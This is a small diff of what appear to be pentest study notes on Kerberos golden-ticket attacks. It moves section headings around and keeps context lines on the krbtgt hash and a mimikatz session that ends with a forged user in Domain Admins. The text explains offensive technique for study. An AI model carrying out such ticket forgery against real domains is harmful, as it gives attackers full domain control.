@@ -1,6 +1,6 @@
+--------------
 GOLDEN TICKETS
-
-DOMAIN CONTROL SYNCHRONIZATION
+--------------
 -KDC encrypts TGT with its secret key. This secret key is password hash of a domain user account called krbtgt.
 -If we can obtain krbtgt password hash, we can create self-made TGT, also known as golden tickets.
 
@@ -26,3 +26,7 @@ mimikatz# misc::cmd
 fake user
 > whoami /groups
 Domain Admins
+
+------------------------------
+DOMAIN CONTROL SYNCHRONIZATION
+------------------------------
